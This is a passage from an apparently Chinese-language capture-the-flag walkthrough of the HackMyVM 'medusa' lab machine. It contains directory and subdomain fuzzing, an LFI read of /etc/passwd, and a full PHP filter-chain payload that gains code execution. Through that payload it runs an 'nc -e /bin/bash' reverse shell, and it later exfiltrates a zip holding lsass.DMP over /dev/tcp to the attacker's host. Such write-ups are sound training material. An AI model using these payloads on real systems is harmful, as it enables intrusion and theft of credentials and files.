/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 0]\n/.                    (Status: 200) [Size: 0]\n/door.php             (Status: 200) [Size: 555]\nProgress: 598000 / 598005 (100.00%)\n===============================================================\nFinished\n===============================================================\n```\n\n\u8bbf\u95ee/door.php\n\n![image-20250331190726085](https://7r1umphk.github.io/image/20250331190726175.png)\n\n\u8f93\u5165\u4e4b\u524d\u83b7\u5f97\u7684Kraken\n\nps:\u6709\u70b9\u641e\u7b11\uff0c\u5b83\u89c4\u5b9a\u4e86\u53ea\u53ef\u4ee5\u8f93\u51656\u4e2a\u5b57\u7b26\n\n![image-20250331190733042](https://7r1umphk.github.io/image/20250331190733131.png)\n\n\u83b7\u5f97\u4e00\u4e2a\u57df\u540d\uff0c\u6211\u4eec\u52a0\u4e0a\uff0c\u5e76\u4e14\u7206\u7834\u4e00\u4e0b\u5b50\u57df\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ffuf -u http://medusa.hmv -H 'Host: FUZZ.medusa.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 3423  \n\n        /'___\\  /'___\\           /'___\\     \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/     \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\    \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/    \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\     \n          \\/_/    \\/_/   \\/___/    \\/_/     \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://medusa.hmv\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.medusa.hmv\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response words: 3423\n________________________________________________\n\ndev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 164ms]\n[WARN] Caught keyboard interrupt (Ctrl-C)\n```\n\n\u52a0\u4e0a\u8bbf\u95ee\n\n![image-20250331190750401](https://7r1umphk.github.io/image/20250331190750557.png)\n \u6ca1\u770b\u5230\u5565\uff0c\u76ee\u5f55\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://dev.medusa.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://dev.medusa.hmv/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 1973]\n/css                  (Status: 301) [Size: 314] [--> http://dev.medusa.hmv/css/]\n/files                (Status: 301) [Size: 316] [--> http://dev.medusa.hmv/files/]\n/assets               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/assets/]\n/.                    (Status: 200) [Size: 1973]\n/manual               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/manual/]\n/robots.txt           (Status: 200) [Size: 489]\nProgress: 470664 / 598005 (78.71%)\nProgress: 491780 / 598005 (82.24%)\n```\n\n\u63a5\u7740\u7206\u7834/files\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://dev.medusa.hmv/files/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://dev.medusa.hmv/files/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 0]\n/system.php           (Status: 200) [Size: 0]\n/.                    (Status: 200) [Size: 0]\n/readme.txt           (Status: 200) [Size: 144]\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://dev.medusa.hmv/files/readme.txt\n-----------------------------------------------\n+  Don't trust your eyes, trust your instinct +\n-----------------------------------------------\n                                                 \n```\n\n\u8c1c\u8bed\u4eba\u6eda\u51fa\u54e5\u8c2d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -u 'http://dev.medusa.hmv/files/system.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://dev.medusa.hmv/files/system.php?FUZZ=id\nTotal requests: 119600\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                            \n=====================================================================\n\n\nTotal time: 60.95589\nProcessed Requests: 119600\nFiltered Requests: 119600\nRequests/sec.: 1962.074\n\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -u 'http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd\nTotal requests: 119600\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                            \n=====================================================================\n\n000000167:   200        27 L     40 W       1452 Ch     'view'                                                             \n^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...\n\nTotal time: 2.243865\nProcessed Requests: 309\nFiltered Requests: 308\nRequests/sec.: 137.7087\n```\n\n\u770b\u773c\u6709\u6ca1\u6709\u5bc6\u94a5\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://dev.medusa.hmv/files/system.php?view=/home/spectre/.ssh/id_rsa\n                           \n```\n\n\u5230\u8fd9\u6211\u4e60\u60ef\u5c31\u662f\u6d4bphp filter\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://dev.medusa.hmv/files/system.php?view=php://filter/convert.base64-encode/resource=/etc/passwd\ncm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTA0OjExMDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA1OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3BlY3RyZTp4OjEwMDA6MTAwMDpzcGVjdHJlLCwsOi9ob21lL3NwZWN0cmU6L2Jpbi9iYXNoCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgpmdHA6eDoxMDY6MTEzOmZ0cCBkYWVtb24sLCw6L3Nydi9mdHA6L3Vzci9zYmluL25vbG9naW4K                                                                                                                                    \n```\n\n\u90a3\u76f4\u63a5\u6267\u884c\u547d\u4ee4\u8bd5\u8bd5\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id' --output -\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\ufffdB\ufffd0\ufffd\ufffd\ufffd>==\ufffd@C\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd>==\ufffd@C\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd>==\ufffd@C\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd>==\ufffd@C\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd>==\ufffd@C\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd>==\ufffd@          \n```\n\n\u5f39shell\n\n```\nhttp://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=nc%20192.168.205.128%208888%20-e%20/bin/bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888                                \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.145] 49190\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6\u53cd\u5411 shell \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```\nwww-data@medusa:/var/www/dev/files$ ls -la\ntotal 16\ndrwxr-xr-x 2 root root 4096 Jan 19  2023 .\ndrwxr-xr-x 5 root root 4096 Jan 19  2023 ..\n-rw-r--r-- 1 root root    0 Jan 15  2023 index.php\n-rw-r--r-- 1 root root  144 Jan 18  2023 readme.txt\n-rw-r--r-- 1 root root  110 Jan 19  2023 system.php\nwww-data@medusa:/var/www/dev/files$ cd ..\nwww-data@medusa:/var/www/dev$ ls -al\ntotal 28\ndrwxr-xr-x 5 root root 4096 Jan 19  2023 .\ndrwxr-xr-x 4 root root 4096 Jan 15  2023 ..\ndrwxr-xr-x 2 root root 4096 Jan 15  2023 assets\ndrwxr-xr-x 2 root root 4096 Jan 15  2023 css\ndrwxr-xr-x 2 root root 4096 Jan 19  2023 files\n-rw-r--r-- 1 root root 1973 Jan 19  2023 index.html\n-rw-r--r-- 1 root root  489 Jan 18  2023 robots.txt\nwww-data@medusa:/var/www/dev$ cd ..\nwww-data@medusa:/var/www$ ls -la\ntotal 16\ndrwxr-xr-x  4 root root 4096 Jan 15  2023 .\ndrwxr-xr-x 12 root root 4096 Jan 15  2023 ..\ndrwxr-xr-x  5 root root 4096 Jan 19  2023 dev\ndrwxr-xr-x  3 root root 4096 Jan 19  2023 html\nwww-data@medusa:/var/www$ cd html/\nwww-data@medusa:/var/www/html$ ls -al\ntotal 24\ndrwxr-xr-x 3 root root  4096 Jan 19  2023 .\ndrwxr-xr-x 4 root root  4096 Jan 15  2023 ..\ndrwxr-xr-x 2 root root  4096 Jan 30  2023 hades\n-rw-r--r-- 1 root root 10674 Jan 19  2023 index.html\nwww-data@medusa:/var/www/html$ cd hades/\nwww-data@medusa:/var/www/html/hades$ ls -al\ntotal 20\ndrwxr-xr-x 2 root root 4096 Jan 30  2023 .\ndrwxr-xr-x 3 root root 4096 Jan 19  2023 ..\n-rw-r--r-- 1 root root  265 Jan 19  2023 d00r_validation.php\n-rw-r--r-- 1 root root  555 Jan 30  2023 door.php\n-rw-r--r-- 1 root root    0 Jan 19  2023 index.php\n-rw-r--r-- 1 root root  198 Jan 19  2023 styles.css\nwww-data@medusa:/var/www/html/hades$ cd /home/\nwww-data@medusa:/home$ ls -al\ntotal 12\ndrwxr-xr-x  3 root    root    4096 Jan 15  2023 .\ndrwxr-xr-x 19 root    root    4096 Jan 15  2023 ..\ndrwxr-xr-x  3 spectre spectre 4096 Jan 18  2023 spectre\nwww-data@medusa:/home$ sudo -l\nsudo: unable to resolve host medusa: Name or service not known\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\n[sudo] password for www-data: \nsudo: a password is required\nwww-data@medusa:/home$ cd spectre/\nwww-data@medusa:/home/spectre$ ls -al\ntotal 32\ndrwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .\ndrwxr-xr-x 3 root    root    4096 Jan 15  2023 ..\n-rw------- 1 spectre spectre  197 Jan 21  2023 .bash_history\n-rw-r--r-- 1 spectre spectre  220 Jan 15  2023 .bash_logout\n-rw-r--r-- 1 spectre spectre 3526 Jan 15  2023 .bashrc\ndrwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .local\n-rw-r--r-- 1 spectre spectre  807 Jan 15  2023 .profile\n-rw------- 1 spectre spectre   44 Jan 18  2023 user.txt\nwww-data@medusa:/home/spectre$ find / -perm -4000 -type f 2>/dev/null\n\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/mount\n/usr/bin/su\nwww-data@medusa:/home/spectre$ \nwww-data@medusa:/home/spectre$ /sbin/getcap -r / 2>/dev/null\n/usr/bin/ping cap_net_raw=ep\nwww-data@medusa:/home/spectre$ ss -tnlup\nNetid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 \nudp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              \ntcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                              \ntcp                     LISTEN                   0                        511                                                    *:80                                                    *:*                                              \ntcp                     LISTEN                   0                        32                                                     *:21                                                    *:*                                              \ntcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                       \nwww-data@medusa:/home/spectre$ cd /opt/\nwww-data@medusa:/opt$ ls -al\ntotal 8\ndrwxr-xr-x  2 root root 4096 Jan 15  2023 .\ndrwxr-xr-x 19 root root 4096 Jan 15  2023 ..\nwww-data@medusa:/opt$ cd /tmp/\nwww-data@medusa:/tmp$ ls -al\ntotal 8\ndrwxrwxrwt  2 root root 4096 Feb  4 04:40 .\ndrwxr-xr-x 19 root root 4096 Jan 15  2023 ..\nwww-data@medusa:/tmp$ cd /mnt/\nwww-data@medusa:/mnt$ ls -al\ntotal 8\ndrwxr-xr-x  2 root root 4096 Jan 15  2023 .\ndrwxr-xr-x 19 root root 4096 Jan 15  2023 ..\nwww-data@medusa:/mnt$ cd /\nwww-data@medusa:/$ ls -la\ntotal 72\ndrwxr-xr-x  19 root root  4096 Jan 15  2023 .\ndrwxr-xr-x  19 root root  4096 Jan 15  2023 ..\ndrwxr-xr-x   2 root root  4096 Jan 18  2023 ...\nlrwxrwxrwx   1 root root     7 Jan 15  2023 bin -> usr/bin\ndrwxr-xr-x   3 root root  4096 Jan 15  2023 boot\ndrwxr-xr-x  17 root root  3140 Feb  4 04:40 dev\ndrwxr-xr-x  71 root root  4096 Feb  4 05:08 etc\ndrwxr-xr-x   3 root root  4096 Jan 15  2023 home\nlrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img -> boot/initrd.img-5.10.0-20-amd64\nlrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64\nlrwxrwxrwx   1 root root     7 Jan 15  2023 lib -> usr/lib\nlrwxrwxrwx   1 root root     9 Jan 15  2023 lib32 -> usr/lib32\nlrwxrwxrwx   1 root root     9 Jan 15  2023 lib64 -> usr/lib64\nlrwxrwxrwx   1 root root    10 Jan 15  2023 libx32 -> usr/libx32\ndrwx------   2 root root 16384 Jan 15  2023 lost+found\ndrwxr-xr-x   3 root root  4096 Jan 15  2023 media\ndrwxr-xr-x   2 root root  4096 Jan 15  2023 mnt\ndrwxr-xr-x   2 root root  4096 Jan 15  2023 opt\ndr-xr-xr-x 148 root root     0 Feb  4 04:40 proc\ndrwx------   3 root root  4096 Jan 30  2023 root\ndrwxr-xr-x  19 root root   540 Feb  4 04:41 run\nlrwxrwxrwx   1 root root     8 Jan 15  2023 sbin -> usr/sbin\ndrwxr-xr-x   3 root root  4096 Jan 15  2023 srv\ndr-xr-xr-x  13 root root     0 Feb  4 04:40 sys\ndrwxrwxrwt   2 root root  4096 Feb  4 04:40 tmp\ndrwxr-xr-x  14 root root  4096 Jan 15  2023 usr\ndrwxr-xr-x  12 root root  4096 Jan 15  2023 var\nlrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz -> boot/vmlinuz-5.10.0-20-amd64\nlrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64\nwww-data@medusa:/$ cd .../\nwww-data@medusa:/...$ ls -al\ntotal 12108\ndrwxr-xr-x  2 root     root         4096 Jan 18  2023 .\ndrwxr-xr-x 19 root     root         4096 Jan 15  2023 ..\n-rw-------  1 www-data www-data 12387024 Jan 18  2023 old_files.zip\n```\n\n\u62f7\u8fc7\u53bb\u770b\u770b\u6709\u5565\n\n```\nwww-data@medusa:/...$ cat old_files.zip > /dev/tcp/192.168.205.128/7777\n\n#kali\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 7777 > old_files.zip                \nlistening on [any] 7777 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.145] 46026\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ unzip old_files.zip\nArchive:  old_files.zip\n   skipping: lsass.DMP               need PK compat. v5.1 (can do v4.6)\n                                       \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ 7z x old_files.zip\n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024\n\nScanning the drive for archives:\n1 file, 12387024 bytes (12 MiB)\n\nExtracting archive: old_files.zip\n--\nPath = old_files.zip\nType = zip\nPhysical Size = 12387024\n\n  \nEnter password (will not be echoed):\nERROR: Wrong password : lsass.DMP\n\n\nSub items Errors: 